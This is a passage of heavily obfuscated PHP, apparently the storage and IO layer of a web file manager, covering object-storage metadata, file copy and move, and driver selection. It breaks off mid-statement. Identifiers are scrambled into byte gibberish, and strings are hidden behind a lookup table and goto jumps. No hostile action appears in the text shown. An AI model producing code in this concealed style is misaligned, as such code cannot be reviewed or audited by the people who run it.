substr($AÏğ¹Ö‚İ, 7); } header($a×†ØâÀµ‘[166] . $AÏğ¹Ö‚İ); die; } public function hashMd5($Eˆ…ˆõÈÅù, $aˆ„ìÉÒ = '') { $Fô·ÕÃİ–Õ =& $_SERVER[¶ªÕß‚ØÁŸ]; $AáÁœ§‡ø = $this->objectMeta($Eˆ…ˆõÈÅù); if (!$AáÁœ§‡ø) { return $Fô·ÕÃİ–Õ[33]; } if (!isset($AáÁœ§‡ø[$Fô·ÕÃİ–Õ[1187]]) && !empty($aˆ„ìÉÒ)) { $eÜ”ËàäÃ = $this->updateObjMeta($Eˆ…ˆõÈÅù, array($Fô·ÕÃİ–Õ[1187] => $aˆ„ìÉÒ)); $AáÁœ§‡ø[$Fô·ÕÃİ–Õ[1187]] = $eÜ”ËàäÃ ? $aˆ„ìÉÒ : $Fô·ÕÃİ–Õ[33]; } return isset($AáÁœ§‡ø[$Fô·ÕÃİ–Õ[1187]]) ? strtolower($AáÁœ§‡ø[$Fô·ÕÃİ–Õ[1187]]) : $Fô·ÕÃİ–Õ[33]; } public function size($D­ßÙÙç) { $BŞçŒÂ›¡Õ = $this->objectMeta($D­ßÙÙç); return $BŞçŒÂ›¡Õ ? $BŞçŒÂ›¡Õ[$_SERVER[¶ªÕß‚ØÁŸ][87]] : 0; } public function info($E”…ò‡íÔŒ) { if ($this->isFolder($E”…ò‡íÔŒ)) { return $this->folderInfo($E”…ò‡íÔŒ); } else { if ($this->isFile($E”…ò‡íÔŒ)) { return $this->fileInfo($E”…ò‡íÔŒ); } } return !1; } public function exist($e¸¿–š¤¡µ) { return $this->isFile($e¸¿–š¤¡µ) || $this->isFolder($e¸¿–š¤¡µ); } public function isFile($D¨‚Œ˜•Õî) { return !$this->isFolder($D¨‚Œ˜•Õî) && $this->objectMeta($D¨‚Œ˜•Õî); } public function isFolder($eÃĞëÅ¿¿‘) { return $this->cacheMethod($_SERVER[¶ªÕß‚ØÁŸ][232], $eÃĞëÅ¿¿‘); } protected function objectMeta($D“¶…Ø¹¼î) { return $this->cacheMethod($_SERVER[¶ªÕß‚ØÁŸ][233], $D“¶…Ø¹¼î); } protected function _objectMeta($båö†º‘å¯) { $CËë«£­© =& $_SERVER[¶ªÕß‚ØÁŸ]; try { $eİ“İø‹Û = $this->client->getObjectMeta($this->bucket, $this->pathEncode($båö†º‘å¯)); } catch (OSS\Core\OssException $A—Õµ„®î«) { $eİ“İø‹Û = !1; } if ($eİ“İø‹Û) { $eİ“İø‹Û[$CËë«£­©[87]] = intval($eİ“İø‹Û[$CËë«£­©[1194]]); } return $eİ“İø‹Û; } protected function _isFolder($e×„º¬íÄó) { $c˜Ä™ƒ¥²» =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($e×„º¬íÄó == $c˜Ä™ƒ¥²»[33] || $e×„º¬íÄó == $c˜Ä™ƒ¥²»[8]) { return !0; } $AĞË÷©Œö» = array($c˜Ä™ƒ¥²»[1184] => $c˜Ä™ƒ¥²»[8], $c˜Ä™ƒ¥²»[196] => rtrim($e×„º¬íÄó, $c˜Ä™ƒ¥²»[8]) . $c˜Ä™ƒ¥²»[8], $c˜Ä™ƒ¥²»[1185] => 1, $c˜Ä™ƒ¥²»[1186] => $c˜Ä™ƒ¥²»[33]); $c·‚µÅóî = $this->client->listObjects($this->bucket, $AĞË÷©Œö»); if ($c·‚µÅóî->getObjectList() || $c·‚µÅóî->getPrefixList()) { return !0; } return !1; } } goto BÖ’‡ã¨Ü; CÜ†Ğ¥íÕ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($aÆÁêœš…, $bæÃ ¼–ø¶) { $DÚÂÁ˜½‚¼ = self::driverMake($bæÃ ¼–ø¶[0]); if (method_exists($DÚÂÁ˜½‚¼, $aÆÁêœš…)) { return @call_user_func_array(array($DÚÂÁ˜½‚¼, $aÆÁêœš…), $bæÃ ¼–ø¶); } if (method_exists($DÚÂÁ˜½‚¼, $_SERVER[¶ªÕß‚ØÁŸ][1001])) { return @call_user_func_array(array($DÚÂÁ˜½‚¼, $aÆÁêœš…), $bæÃ ¼–ø¶); } else { if (method_exists(self, $aÆÁêœš…)) { return @call_user_func_array(array(self, $aÆÁêœš…), $bæÃ ¼–ø¶); } else { call_user_func_array(array(parent, $aÆÁêœš…), $bæÃ ¼–ø¶); } } } public static function init($bÛÒ×Ğö) { return self::driverMake($bÛÒ×Ğö); } public static function copy($b÷İ¶‹Ğï², $a‹×¹¥¿‡, $bÊÏ¿œ•”œ = false, $FÎ¼ŞÎ‰ = false) { return self::copyMove($b÷İ¶‹Ğï², $a‹×¹¥¿‡, $bÊÏ¿œ•”œ, $_SERVER[¶ªÕß‚ØÁŸ][498], $FÎ¼ŞÎ‰); } public static function move($b‘»ËÖÊï, $AÑù°¤¹Š, $b±ÀÁ¶ù»‰ = false, $cïòõğõôÄ = false) { return self::copyMove($b‘»ËÖÊï, $AÑù°¤¹Š, $b±ÀÁ¶ù»‰, $_SERVER[¶ªÕß‚ØÁŸ][500], $cïòõğõôÄ); } public static function saveFile($Aà‹Ğ£ë‰Ü, $a³¹Øò¤“, $D³­Á³¡¯‹ = true) { goto C±Ûöê„‰À; bê¢²Ü÷Úö: $eñÂ˜Ü„ = self::copyFile($dõÈŒÂíôÂ, $Aà‹Ğ£ë‰Ü, $fÑîÑïéÑ, $CØâá—Ğò±, $FöÍ³ïôÀŠ[$dˆëï¢Í[28]], $AĞù¼°‚âÀ); if ($fŒÈî’‡¡É) { $eñÂ˜Ü„ = $fŒÈî’‡¡É->getPathOuter($eñÂ˜Ü„); } return $eñÂ˜Ü„; goto Bƒ‘¸°»Æ; fœÙ÷Š‚ç•: $fÑîÑïéÑ = self::driverMake($a³¹Øò¤“); $fŒÈî’‡¡É = !1; if ($fÑîÑïéÑ->pathParse[$dˆëï¢Í[1002]]) { $B¢í“ÁŒêÑ = $fÑîÑïéÑ->pathParse[$dˆëï¢Í[1002]]; $fŒÈî’‡¡É = $fÑîÑïéÑ; $fÑîÑïéÑ = self::driverMake($B¢í“ÁŒêÑ); } goto DÎåÃÇÛ‹÷; DÎåÃÇÛ‹÷: $CØâá—Ğò± = $fÑîÑïéÑ->pathFather($a³¹Øò¤“); $AĞù¼°‚âÀ = !0; if (!$D³­Á³¡¯‹ && self::driverIsSame($dõÈŒÂíôÂ, $fÑîÑïéÑ)) { $AĞù¼°‚âÀ = !1; } goto bê¢²Ü÷Úö; C±Ûöê„‰À: $dˆëï¢Í =& $_SERVER[¶ªÕß‚ØÁŸ]; $FöÍ³ïôÀŠ = self::info($a³¹Øò¤“); $dõÈŒÂíôÂ = self::driverMake($Aà‹Ğ£ë‰Ü); goto fœÙ÷Š‚ç•; Bƒ‘¸°»Æ: } private static function copyMove($cåäÁ’í‚±, $d‚ÊïãÕß¦, $d¯ê¬Ë›¹ó, $cËÔïÒˆÏ¦, $Eï²¸ºãÏİ = false) { goto cÓ‡ßÑ ä½; D™öà¦¯ƒ»: $dóë›Ä­µ¬ = $fëöÈÀ±«ˆ->isFile($cåäÁ’í‚±); if (!$dóë›Ä­µ¬ && $F¾¦Íñ®—->getType() == $fÌÑØˆõ‡Ş[707] && $fëöÈÀ±«ˆ->getType() == $fÌÑØˆõ‡Ş[112]) { $B³ñæµÍ‹ö = $F¾¦Íñ®—->copyFolderFromIO($fëöÈÀ±«ˆ, $cåäÁ’í‚±, $d‚ÊïãÕß¦, $d¯ê¬Ë›¹ó, $eÏ‹ÆÎ³Ò, $Eï²¸ºãÏİ); } else { $B³ñæµÍ‹ö = self::copyPath($fëöÈÀ±«ˆ, $cåäÁ’í‚±, $F¾¦Íñ®—, $d‚ÊïãÕß¦, $d¯ê¬Ë›¹ó, $eÏ‹ÆÎ³Ò, $dóë›Ä­µ¬, $Eï²¸ºãÏİ); } if ($B³ñæµÍ‹ö && $eÏ‹ÆÎ³Ò) { $fëöÈÀ±«ˆ->remove($cåäÁ’í‚±); } goto dÒ˜«Ãöî‹; cÓ‡ßÑ ä½: $fÌÑØˆõ‡Ş =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$cåäÁ’í‚± || $cåäÁ’í‚± == $fÌÑØˆõ‡Ş[8] || !$d‚ÊïãÕß¦) { return !1; } ignore_timeout(); goto E‰ÀôÉç; dÒ˜«Ãöî‹: if ($Cñ®¶ßÉĞŒ) { $B³ñæµÍ‹ö = $Cñ®¶ßÉĞŒ->getPathOuter($B³ñæµÍ‹ö); } return $B³ñæµÍ‹ö; goto D²œ„¿ŒƒŒ; e¡‘áÔ“ğ: $Cñ®¶ßÉĞŒ = !1; if ($F¾¦Íñ®—->pathParse[$fÌÑØˆõ‡Ş[1002]]) { $d‚ÊïãÕß¦ = $F¾¦Íñ®—->pathParse[$fÌÑØˆõ‡Ş[1002]]; $Cñ®¶ßÉĞŒ = $F¾¦Íñ®—; $F¾¦Íñ®— = self::driverMake($d‚ÊïãÕß¦); } self::check($fëöÈÀ±«ˆ, $cåäÁ’í‚±, $F¾¦Íñ®—, $d‚ÊïãÕß¦); goto bÆÑ‰ãßÏĞ; E‰ÀôÉç: $fëöÈÀ±«ˆ = self::driverMake($cåäÁ’í‚±); $F¾¦Íñ®— = self::driverMake($d‚ÊïãÕß¦); $eÏ‹ÆÎ³Ò = $cËÔïÒˆÏ¦ == $fÌÑØˆõ‡Ş[500]; goto e¡‘áÔ“ğ; bÆÑ‰ãßÏĞ: Hook::trigger($fÌÑØˆõ‡Ş[82], $fëöÈÀ±«ˆ, $cåäÁ’í‚±, $F¾¦Íñ®—, $d‚ÊïãÕß¦); $E°ÁÕğÁàÇ = self::driverIsSame($fëöÈÀ±«ˆ, $F¾¦Íñ®—); if ($E°ÁÕğÁàÇ) { if ($cËÔïÒˆÏ¦ == $fÌÑØˆõ‡Ş[500] && trim($d‚ÊïãÕß¦, $fÌÑØˆõ‡Ş[8]) == trim($F¾¦Íñ®—->pathFather($cåäÁ’í‚±), $fÌÑØˆõ‡Ş[8])) { return $F¾¦Íñ®—->getPathOuter($cåäÁ’í‚±); } if (method_exists($F¾¦Íñ®—, $cËÔïÒˆÏ¦)) { return $F¾¦Íñ®—->{$cËÔïÒˆÏ¦}($cåäÁ’í‚±, $d‚ÊïãÕß¦, $d¯ê¬Ë›¹ó); } } goto D™öà¦¯ƒ»; D²œ„¿ŒƒŒ: } private static function check($aó¶±à®ˆ, $EÖÖŸõ¸ç¸, $B„ˆ“Øƒõ„, &$b²õÎ´ÓŸ¤) { $B¸ñŞ¢ô…÷ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (self::driverIsSame($aó¶±à®ˆ, $B„ˆ“Øƒõ„) && $aó¶±à®ˆ->isFolder($EÖÖŸõ¸ç¸) && $aó¶±à®ˆ->isParentOf($EÖÖŸõ¸ç¸, $b²õÎ´ÓŸ¤)) { show_json(LNG($B¸ñŞ¢ô…÷[1003]), !1); } if (!$aó¶±à®ˆ->exist($EÖÖŸõ¸ç¸)) { show_json(LNG($B¸ñŞ¢ô…÷[111]), !1); } } private static function copyPath($D²”§ğµ…, $dËª³Œ™, $Dî•À«÷ù, $bõİ—ñˆõ…, $eä¶ˆô›¥ñ, $Aº„êéâ¸, $b¸ ìé¦Ô¨, $f—µ„¼”ÆÍ = false) { goto e®«àœÊÓÅ; e®«àœÊÓÅ: $b‘Ò¼¼ğÎô =& $_SERVER[¶ªÕß‚ØÁŸ]; $c˜„±è±Æß = $f—µ„¼”ÆÍ ? $f—µ„¼”ÆÍ : $D²”§ğµ…->getPathName($D²”§ğµ…->pathThis($dËª³Œ™)); if ($eä¶ˆô›¥ñ) { $eä²Ş‡“×÷ = $Dî•À«÷ù->fileNameExist($bõİ—ñˆõ…, $c˜„±è±Æß); $c˜„±è±Æß = $Dî•À«÷ù->fileNameAuto($bõİ—ñˆõ…, $c˜„±è±Æß, $eä¶ˆô›¥ñ, !$b¸ ìé¦Ô¨); $eä¶ˆô›¥ñ = $eä²Ş‡“×÷ ? $eä¶ˆô›¥ñ : !1; } goto CÛ²„”ßª; CÛ²„”ßª: if ($b¸ ìé¦Ô¨) { return self::copyFile($D²”§ğµ…, $dËª³Œ™, $Dî•À«÷ù, $bõİ—ñˆõ…, $c˜„±è±Æß, $Aº„êéâ¸); } if ($eä¶ˆô›¥ñ == REPEAT_RENAME_FOLDER) { $eä¶ˆô›¥ñ = !1; } $Föñë¶¥ïˆ = rtrim($bõİ—ñˆõ…, $b‘Ò¼¼ğÎô[8]) . $b‘Ò¼¼ğÎô[8] . $c˜„±è±Æß; goto c¼¯­ºæÌ´; f‘ÉàŠàµÎ: $C±Á±Û¯ø = array_merge($Dò¶¿Ÿç”î[$b‘Ò¼¼ğÎô[83]], $Dò¶¿Ÿç”î[$b‘Ò¼¼ğÎô[84]]); foreach ($C±Á±Û¯ø as $FÑ×Ë‹ñŒÏ) { $CÖ»§ë‚ç = $FÑ×Ë‹ñŒÏ[$b‘Ò¼¼ğÎô[29]] == $b‘Ò¼¼ğÎô[177]; $dËª³Œ™ = $D²”§ğµ…->getPathInner($FÑ×Ë‹ñŒÏ[$b‘Ò¼¼ğÎô[85]]); $DÆáòÏ™©‡ = self::copyPath($D²”§ğµ…, $dËª³Œ™, $Dî•À«÷ù, $bõİ—ñˆõ…, $eä¶ˆô›¥ñ, $Aº„êéâ¸, $CÖ»§ë‚ç); if (!$DÆáòÏ™©‡) { write_log($b‘Ò¼¼ğÎô[1004] . $dËª³Œ™ . $b‘Ò¼¼ğÎô[1005] . $bõİ—ñˆõ…, $b‘Ò¼¼ğÎô[1006]); } } return $eñšë—é³œ; goto aÆ¤´ÀÒ³Ö; c¼¯­ºæÌ´: $eñšë—é³œ = $Dî•À«÷ù->mkdir($Dî•À«÷ù->getPath($Föñë¶¥ïˆ)); $bõİ—ñˆõ… = $Dî•À«÷ù->getPathInner($eñšë—é³œ); $Dò¶¿Ÿç”î = $D²”§ğµ…->listPath($dËª³Œ™, !0); goto f‘ÉàŠàµÎ; aÆ¤´ÀÒ³Ö: } private static function copyFile($Dä¡‡º¯È, $d÷ØàÖ¾, $DÌç´Ñ›Ş, $få¾›¨•¿½, $c¸’ãÏ—ÛÁ, $b–§–ØÉíµ) { goto eß™«ÄÄê; F‹ï ‚†: $EÒùèÛ‡‰ = $Dä¡‡º¯È->iconvApp($EÒùèÛ‡‰); $F’™çó—¬ = $DÌç´Ñ›Ş->upload($få¾›¨•¿½, $EÒùèÛ‡‰, $b–§–ØÉíµ); self::remove($cÛÊ«›ˆä . $E­Û®¶¼œÚ); goto FêÈ¾²åÔË; FêÈ¾²åÔË: Hook::trigger($DÄÉôÁñ¿‹[1009], $Dä¡‡º¯È, $d÷ØàÖ¾, $DÌç´Ñ›Ş, $få¾›¨•¿½, $c¸’ãÏ—ÛÁ, $F’™çó—¬); return $F’™çó—¬; goto Aƒ·í‹–‡; e‚‹¶Ûø…Œ: mk_dir($cÛÊ«›ˆä); $EÒùèÛ‡‰ = $cÛÊ«›ˆä . $E­Û®¶¼œÚ; $EÒùèÛ‡‰ = $Dä¡‡º¯È->download($d÷ØàÖ¾, $EÒùèÛ‡‰); goto F‹ï ‚†; eß™«ÄÄê: $DÄÉôÁñ¿‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $få¾›¨•¿½ = $DÌç´Ñ›Ş->getPath(rtrim($få¾›¨•¿½, $DÄÉôÁñ¿‹[8]) . $DÄÉôÁñ¿‹[8] . $c¸’ãÏ—ÛÁ); $E­Û®¶¼œÚ = $DÄÉôÁñ¿‹[1007] . time() . rand_string(5); goto bèÆ²ÁÏÅ; bèÆ²ÁÏÅ: Hook::trigger($DÄÉôÁñ¿‹[1008], $Dä¡‡º¯È, $d÷ØàÖ¾, $DÌç´Ñ›Ş, $få¾›¨•¿½, $c¸’ãÏ—ÛÁ, $E­Û®¶¼œÚ); if (self::driverIsSame($Dä¡‡º¯È, $DÌç´Ñ›Ş)) { if ($b–§–ØÉíµ) { $F’™çó—¬ = $DÌç´Ñ›Ş->moveFile($d÷ØàÖ¾, $få¾›¨•¿½); } else { $F’™çó—¬ = $DÌç´Ñ›Ş->copyFile($d÷ØàÖ¾, $få¾›¨•¿½); } Hook::trigger($DÄÉôÁñ¿‹[1009], $Dä¡‡º¯È, $d÷ØàÖ¾, $DÌç´Ñ›Ş, $få¾›¨•¿½, $c¸’ãÏ—ÛÁ, $F’™çó—¬); return $F’™çó—¬; } $cÛÊ«›ˆä = TEMP_FILES; goto e‚‹¶Ûø…Œ; Aƒ·í‹–‡: } public static function pathFather($E÷ê„ŞÑì) { $dÖÓÅÂ‡Š× = IO::init($E÷ê„ŞÑì); $aÜÊ‘–ñ©ª = $dÖÓÅÂ‡Š×->pathFather($dÖÓÅÂ‡Š×->path); return $dÖÓÅÂ‡Š×->getPathOuter($aÜÊ‘–ñ©ª); } public static function fileOut($e¸ÕÓÜ«„†, $cò÷ô·ÉÍ¡ = false, $Bˆí ÚĞ¢Æ = false, $fÅšµäªŒ› = '') { $EÌÇæ¶Å³õ = self::driverMake($e¸ÕÓÜ«„†); if ($EÌÇæ¶Å³õ->isFileOutServer()) { return $EÌÇæ¶Å³õ->fileOutServer($e¸ÕÓÜ«„†, $cò÷ô·ÉÍ¡, $Bˆí ÚĞ¢Æ, $fÅšµäªŒ›); } return $EÌÇæ¶Å³õ->fileOut($e¸ÕÓÜ«„†, $cò÷ô·ÉÍ¡, $Bˆí ÚĞ¢Æ, $fÅšµäªŒ›); } public static function fileOutImage($BŸêÑ…Û˜Ò, $DÀ²¦µ¾“Í = 250) { $AêŠé˜É¡ = array(250, 600, 1200, 3000); for ($b£ç˜¤˜’Š = 0; $b£ç˜¤˜’Š < count($AêŠé˜É¡); $b£ç˜¤˜’Š++) { if ($b£ç˜¤˜’Š == 0 && $DÀ²¦µ¾“Í <= $AêŠé˜É¡[$b£ç˜¤˜’Š]) { $DÀ²¦µ¾“Í = $AêŠé˜É¡[$b£ç˜¤˜’Š]; break; } else { if ($DÀ²¦µ¾“Í > $AêŠé˜É¡[$b£ç˜¤˜’Š - 1] && $DÀ²¦µ¾“Í <= $AêŠé˜É¡[$b£ç˜¤˜’Š]) { $DÀ²¦µ¾“Í = $AêŠé˜É¡[$b£ç˜¤˜’Š]; break; } else { if ($b£ç˜¤˜’Š == count($AêŠé˜É¡) - 1 && $DÀ²¦µ¾“Í > $AêŠé˜É¡[$b£ç˜¤˜’Š]) { $DÀ²¦µ¾“Í = $AêŠé˜É¡[$b£ç˜¤˜’Š]; break; } } } } $c‹ÍøÇ¿ô = self::driverMake($BŸêÑ…Û˜Ò); if ($c‹ÍøÇ¿ô->isFileOutServer()) { return $c‹ÍøÇ¿ô->fileOutImageServer($BŸêÑ…Û˜Ò, $DÀ²¦µ¾“Í); } return $c‹ÍøÇ¿ô->fileOutImage($BŸêÑ…Û˜Ò, $DÀ²¦µ¾“Í); } private static function driverIsSame($cø†»Õ¼“ƒ, $e‰ËÅ„°Ş) { goto D®×ÀÒ‚’«; D®×ÀÒ‚’«: $Bá—ï¾¼•Ÿ =& $_SERVER[¶ªÕß‚ØÁŸ]; $c·ÅÏ’‚õ = $cø†»Õ¼“ƒ->getType(); $F£²—šˆ¸ë = $e‰ËÅ„°Ş->getType(); goto e¥‰ê—äï†; e¥‰ê—äï†: if ($c·ÅÏ’‚õ != $F£²—šˆ¸ë) { return !1; } if ($c·ÅÏ’‚õ == $Bá—ï¾¼•Ÿ[707]) { return !0; } if ($c·ÅÏ’‚õ == $Bá—ï¾¼•Ÿ[112]) { return !0; } goto BÉõŠÍñ; BÉõŠÍñ: if ($cø†»Õ¼“ƒ->pathDriver == $e‰ËÅ„°Ş->pathDriver) { return !0; } return !1; goto e•Â­Şš¸; e•Â­Şš¸: } public static function copyUpdate($CÇÈµ‡”íÖ, $FšáÏè÷º¡) { goto FÆĞğÎß›¹; CŞÇÖ‚ä¢Ï: Hook::trigger($dÒÓÅØ”à˜[1013], $CÇÈµ‡”íÖ, $FšáÏè÷º¡, $fîÈÆÚšŠ†); foreach ($C‘¾œÚ´œ as $Dº×¯¶§) { IO::mkdir($Dº×¯¶§); } foreach ($a¢³—çËå„ as $Dº×¯¶§) { IO::copy($Dº×¯¶§[$dÒÓÅØ”à˜[1010]], $Dº×¯¶§[$dÒÓÅØ”à˜[1011]], REPEAT_REPLACE); } goto E¹›Ùø™¶ê; FÊìÓ¨¸Š: $BƒÆçíÇÄæ = self::_listAll($CÇÈµ‡”íÖ); $aÒƒšØ‹‰ = self::_listAll($FšáÏè÷º¡); $a¢³—çËå„ = array(); goto BãĞë‚­Ñ¶; BãĞë‚­Ñ¶: $C‘¾œÚ´œ = array(); foreach ($BƒÆçíÇÄæ as $eÂŠÛò…¶¢ => $Dº×¯¶§) { if (isset($aÒƒšØ‹‰[$eÂŠÛò…¶¢])) { if ($Dº×¯¶§[$dÒÓÅØ”à˜[86]] == 1) { continue; } if ($aÒƒšØ‹‰[$eÂŠÛò…¶¢][$dÒÓÅØ”à˜[87]] == $Dº×¯¶§[$dÒÓÅØ”à˜[87]]) { continue; } } if ($Dº×¯¶§[$dÒÓÅØ”à˜[86]] == 1) { $C‘¾œÚ´œ[] = $FšáÏè÷º¡ . $dÒÓÅØ”à˜[8] . $eÂŠÛò…¶¢; continue; } $e£çÛ»­²Ø = strstr(trim($eÂŠÛò…¶¢, $dÒÓÅØ”à˜[8]), $dÒÓÅØ”à˜[8]) ? get_path_father($eÂŠÛò…¶¢) : $dÒÓÅØ”à˜[33]; $a¢³—çËå„[] = array($dÒÓÅØ”à˜[1010] => $Dº×¯¶§[$dÒÓÅØ”à˜[85]], $dÒÓÅØ”à˜[1011] => rtrim($FšáÏè÷º¡, $dÒÓÅØ”à˜[8]) . $dÒÓÅØ”à˜[8] . $e£çÛ»­²Ø, $dÒÓÅØ”à˜[1012] => $Dº×¯¶§); } $fîÈÆÚšŠ† = array($dÒÓÅØ”à˜[177] => $a¢³—çËå„, $dÒÓÅØ”à˜[86] => $C‘¾œÚ´œ); goto CŞÇÖ‚ä¢Ï; FÆĞğÎß›¹: $dÒÓÅØ”à˜ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!IO::exist($CÇÈµ‡”íÖ)) { return !1; } if (!IO::exist($FšáÏè÷º¡)) { IO::mkdir($FšáÏè÷º¡); } goto FÊìÓ¨¸Š; E¹›Ùø™¶ê: } private static function _listAll($b®¤’ÕÜ£) { $a¦ñ¶ÌÒƒ» =& $_SERVER[¶ªÕß‚ØÁŸ]; $b®¤’ÕÜ£ = KodIO::clear($b®¤’ÕÜ£); $Cç…ÊÇÍ¢ = IO::listAll($b®¤’ÕÜ£); foreach ($Cç…ÊÇÍ¢ as &$aºÂ£† Èë) { $Dß±×°Ø…Ì = substr($aºÂ£† Èë[$a¦ñ¶ÌÒƒ»[85]], strlen($b®¤’ÕÜ£)); $aºÂ£† Èë[$a¦ñ¶ÌÒƒ»[1014]] = trim($Dß±×°Ø…Ì, $a¦ñ¶ÌÒƒ»[8]); } return array_to_keyvalue($Cç…ÊÇÍ¢, $a¦ñ¶ÌÒƒ»[1014]); } public static function fileSubstr($B´™êÀ¼¨¾, $C˜·ø„øçÈ, $eÕ¢‹ĞóùŞ = false) { goto fÊ‚Æˆ§Œ; d½éø¦¶¤«: return $Fğ—ÏìàÏä->fileSubstr($B´™êÀ¼¨¾, $C˜·ø„øçÈ, $eÕ¢‹ĞóùŞ); goto fĞ¸áöˆ«Î; fÊ‚Æˆ§Œ: $Fğ—ÏìàÏä = self::driverMake($B´™êÀ¼¨¾); $Cù¾©Ü‚‰à = $Fğ—ÏìàÏä->size($B´™êÀ¼¨¾); $D…òñµÅÆ = $C˜·ø„øçÈ; goto B”»Šƒñï; B”»Šƒñï: $a³ö°é÷’ = $eÕ¢‹ĞóùŞ; if ($C˜·ø„øçÈ < 0) { $C˜·ø„øçÈ = $Cù¾©Ü‚‰à + $C˜·ø„øçÈ; } if ($eÕ¢‹ĞóùŞ === !1) { $eÕ¢‹ĞóùŞ = $Cù¾©Ü‚‰à - $C˜·ø„øçÈ; } goto fó“ùøî‘; fó“ùøî‘: if ($C˜·ø„øçÈ + $eÕ¢‹ĞóùŞ > $Cù¾©Ü‚‰à) { $eÕ¢‹ĞóùŞ = $Cù¾©Ü‚‰à - $C˜·ø„øçÈ; } if ($eÕ¢‹ĞóùŞ <= 0) { return $_SERVER[¶ªÕß‚ØÁŸ][33]; } if ($C˜·ø„øçÈ < 0 || $C˜·ø„øçÈ >= $Cù¾©Ü‚‰à || $eÕ¢‹ĞóùŞ > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\145\122\145\x61\144\40\x65\x72\162\x6f\162\41\40\x73\x74\x61\x72\x74\x3d{$C˜·ø„øçÈ}\73\x6c\x65\156\x67\164\150\75{$eÕ¢‹ĞóùŞ}\x3b\x20\x73\x69\172\145\75{$Cù¾©Ü‚‰à}\x3b"); } goto d½éø¦¶¤«; fĞ¸áöˆ«Î: } private static function driverMake(&$bÙœòÔŒœ) { goto E¡Ö‹ë²„; fŠ‚ÎöÍˆ: if ($cĞ±¶„ªâ[$B³òòÒõˆİ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$cĞ±¶„ªâ[$B³òòÒõˆİ[375]]]) { return !1; } $bÙœòÔŒœ = $cĞ±¶„ªâ[$B³òòÒõˆİ[1015]]; $f™¬ÁãÙ®Ş = self::driverGet($cĞ±¶„ªâ, $bÙœòÔŒœ); goto c¢¾Í—õĞ´; E¡Ö‹ë²„: $B³òòÒõˆİ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cĞ±¶„ªâ = KodIO::parse($bÙœòÔŒœ); if (!self::$driverListSystem) { $CÀ¹İ–Ì™ê = Model($B³òòÒõˆİ[717])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($CÀ¹İ–Ì™ê, $B³òòÒõˆİ[375]); } goto fŠ‚ÎöÍˆ; c¢¾Í—õĞ´: return $f™¬ÁãÙ®Ş; goto DÇŸô¶“õø; DÇŸô¶“õø: } private static function driverGet($BÀËŠÜ•èÂ, &$B…‚„‘µ½) { goto fÑğ•‡’ËŒ; bİ·ÄÎ‚¥™: $DÜ¾Ÿ‰Ä¾‹ = self::$driverCache[$E¤Ò¿¯¯¶]; $DÜ¾Ÿ‰Ä¾‹->pathDriver = $d¥Ÿ¦Õƒ¸Ï; $DÜ¾Ÿ‰Ä¾‹->pathBase = $EÆ¾¶ö„íœ[33]; goto A¸°ÁÛ±Ø«; e…ù¯”èÓ‘: switch ($BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[29]]) { case KodIO::KOD_IO: $fùí©‡ìŠ = self::$driverListSystem[$Aõï¾ä±¢‹]; break; case KodIO::KOD_SOURCE: $B…‚„‘µ½ = $Aõï¾ä±¢‹ . $B…‚„‘µ½; $fùí©‡ìŠ = array($EÆ¾¶ö„íœ[1017] => $EÆ¾¶ö„íœ[1018], $EÆ¾¶ö„íœ[6] => $BÀËŠÜ•èÂ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $D»„Ÿ›Õå» = $GLOBALS[$EÆ¾¶ö„íœ[1019]]; self::$driverListUser = array_to_keyvalue($D»„Ÿ›Õå», $EÆ¾¶ö„íœ[375]); } $fùí©‡ìŠ = self::$driverListUser[$Aõï¾ä±¢‹]; break; case KodIO::KOD_SHARE_LINK: $fùí©‡ìŠ = array($EÆ¾¶ö„íœ[1017] => $EÆ¾¶ö„íœ[1020], $EÆ¾¶ö„íœ[6] => $BÀËŠÜ•èÂ); $F˜‡Íğâ»Ö = Action($EÆ¾¶ö„íœ[1021])->sharePathInfo($BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[85]]); $B…‚„‘µ½ = $F˜‡Íğâ»Ö[$EÆ¾¶ö„íœ[377]]; if (!$F˜‡Íğâ»Ö[$EÆ¾¶ö„íœ[377]]) { $Eö”ªÄï¬¤ = Model($EÆ¾¶ö„íœ[544])->getInfo($F˜‡Íğâ»Ö[$EÆ¾¶ö„íœ[449]]); $B…‚„‘µ½ = KodIO::clear($Eö”ªÄï¬¤[$EÆ¾¶ö„íœ[1022]] . $BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[1015]]); $BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[447]] = $Eö”ªÄï¬¤; $BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[1002]] = $B…‚„‘µ½; $fùí©‡ìŠ = array($EÆ¾¶ö„íœ[1017] => $EÆ¾¶ö„íœ[1023], $EÆ¾¶ö„íœ[6] => $BÀËŠÜ•èÂ); } break; case KodIO::KOD_SHARE_ITEM: $fùí©‡ìŠ = array($EÆ¾¶ö„íœ[1017] => $EÆ¾¶ö„íœ[1024], $EÆ¾¶ö„íœ[6] => $BÀËŠÜ•èÂ); $Eö”ªÄï¬¤ = Model($EÆ¾¶ö„íœ[544])->getInfo($BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[375]]); if ($Eö”ªÄï¬¤[$EÆ¾¶ö„íœ[377]] == $EÆ¾¶ö„íœ[476]) { $B…‚„‘µ½ = KodIO::clear($Eö”ªÄï¬¤[$EÆ¾¶ö„íœ[1022]] . $BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[1015]]); $BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[447]] = $Eö”ªÄï¬¤; $BÀËŠÜ•èÂ[$EÆ¾¶ö„íœ[1002]] = $B…‚„‘µ½; $fùí©‡ìŠ = array($EÆ¾¶ö„íœ[1017] => $EÆ¾¶ö„íœ[1025], $EÆ¾¶ö„íœ[6] => $BÀËŠÜ•èÂ); } break; default: $B…‚„‘µ½ = 